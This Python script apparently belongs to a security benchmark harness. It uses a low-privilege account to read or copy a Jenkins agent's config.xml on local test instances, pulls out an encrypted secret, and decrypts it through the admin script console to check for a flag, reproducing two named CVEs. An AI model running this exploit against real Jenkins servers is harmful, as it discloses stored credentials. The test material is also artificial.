#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]

Drives the REAL Jenkins controller over EXTERNAL HTTP (basic auth + CSRF crumb).
Never docker exec. Seed probe=read (CVE-2025-27622); residual probe=copy (CVE-2025-31721).
"""
from __future__ import annotations

import base64
import http.cookiejar
import json
import os
import re
import secrets as _secrets
import sys
import urllib.error
import urllib.request

CIPHER_RE = re.compile(r"\{AQAA[A-Za-z0-9+/=]+\}")
ADMIN = ("admin", "admin123")
ATTACKER = ("attacker", "attacker123")
HOSTPORT = {"v0": 18821, "v1": 18822, "v2": 18823}


def new_flag():
    return os.environ.get("PCB_FLAG") or os.environ.get("PCB_X") or "PCBFLAG_UNSET"


X = os.environ.get("PCB_X") or new_flag()


def _target_base(version: str) -> str:
    pbt = os.environ.get("PCB_TARGET_BASE")
    if pbt:
        return pbt.rstrip("/")
    pt = os.environ.get("PCB_TARGET_PORT")
    if pt:
        return f"http://127.0.0.1:{int(pt)}"
    return f"http://127.0.0.1:{int(HOSTPORT[version])}"


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class _Session:
    """Authenticated HTTP session (cookie jar) so the CSRF crumb stays bound to JSESSIONID."""

    def __init__(self, version, creds):
        self.base = _target_base(version)
        self.auth = "Basic " + base64.b64encode(f"{creds[0]}:{creds[1]}".encode()).decode()
        self.opener = urllib.request.build_opener(
            _NoRedirect(), urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
        )

    def req(self, path, *, method="GET", crumb=None, data=None, timeout=30):
        headers = {"Authorization": self.auth}
        if crumb:
            headers[crumb[0]] = crumb[1]
        body = data.encode() if isinstance(data, str) else data
        r = urllib.request.Request(self.base + path, data=body, method=method, headers=headers)
        try:
            with self.opener.open(r, timeout=timeout) as resp:
                return resp.status, resp.read(200000).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            if e.code in (301, 302, 303, 307, 308):
                return e.code, ""
            return e.code, e.read(8000).decode("utf-8", "replace")
        except Exception as e:  # noqa: BLE001
            return -1, f"HTTP_ERROR {type(e).__name__}: {e}"

    def crumb(self):
        st, body = self.req("/crumbIssuer/api/json")
        if st != 200:
            return None
        try:
            j = json.loads(body)
            return (j["crumbRequestField"], j["crumb"])
        except Exception:
            return None


def _decrypt(version, cipher):
    if not cipher:
        return ""
    sess = _Session(version, ADMIN)
    crumb = sess.crumb()
    if not crumb:
        return ""
    script = "println(hudson.util.Secret.decrypt(%r)?.getPlainText())" % cipher
    st, body = sess.req(
        "/scriptText",
        method="POST",
        crumb=crumb,
        data="script=" + urllib.request.quote(script),
    )
    return body.strip() if st == 200 else ""


def run_probe(candidate, *, version="v1"):
    probe = candidate.get("probe") if isinstance(candidate, dict) else candidate
    denied, cipher, status = "", "", None
    sess = _Session(version, ATTACKER)

    if probe == "read":
        status, body = sess.req("/computer/agentA/config.xml")
        if status == 200:
            m = CIPHER_RE.search(body)
            cipher = m.group(0) if m else ""
        else:
            denied = f"read denied (HTTP {status})"

    elif probe == "copy":
        new_name = "agentB_" + _secrets.token_hex(4)
        crumb = sess.crumb()
        status, _ = sess.req(
            f"/computer/createItem?name={new_name}&mode=copy&from=agentA",
            method="POST",
            crumb=crumb,
        )
        if status in (200, 302):
            rst, body = sess.req(f"/computer/{new_name}/config.xml")
            if rst == 200:
                m = CIPHER_RE.search(body)
                cipher = m.group(0) if m else ""
            else:
                denied = f"copied-agent read denied (HTTP {rst})"
        else:
            denied = f"copy refused (HTTP {status})"
    else:
        raise ValueError("unknown probe: %r" % probe)

    recovered = _decrypt(version, cipher)
    return {
        "version": version,
        "id": candidate.get("id") if isinstance(candidate, dict) else None,
        "probe": probe,
        "http_status": status,
        "denied": denied,
        "cipher_seen": cipher[:24] + "..." if cipher else "",
        "recovered_secret": recovered,
        "X": X if X and X in recovered else "",
    }


if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))
